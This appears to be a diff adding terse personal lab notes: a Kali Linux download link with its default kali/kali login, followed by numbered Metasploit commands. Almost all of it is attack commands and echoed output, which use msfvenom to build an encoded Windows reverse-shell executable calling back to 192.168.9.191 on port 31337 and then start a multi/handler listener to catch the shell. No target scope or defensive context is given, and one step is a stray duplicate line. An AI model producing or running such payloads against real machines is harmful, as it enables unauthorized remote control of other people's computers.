@@ -1,0 +1,23 @@
+Kali Linux Link :
+https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-vmware-amd64.7z
+
+User - kali 
+password - kali
+
+Open Kali Linux Cmd :
+sudo apt update
+sudo apt upgrade
+
+Open metasploitframework :
+
+1.  msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.9.191 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe –o /tmp/1.exe
+2.  msfconsole
+3.  use exploit/multi/handler
+4.  set payload windows/shell/reverse_tcp
+5.  windows/shell/reverse_tcp
+6.  Show options
+7.  set LHOST 192.168.9.191
+8.  LHOST => 192.168.9.191 (output)
+9.  set LPORT 31337
+10. LPORT => 31337 (output)
+11.  exploit
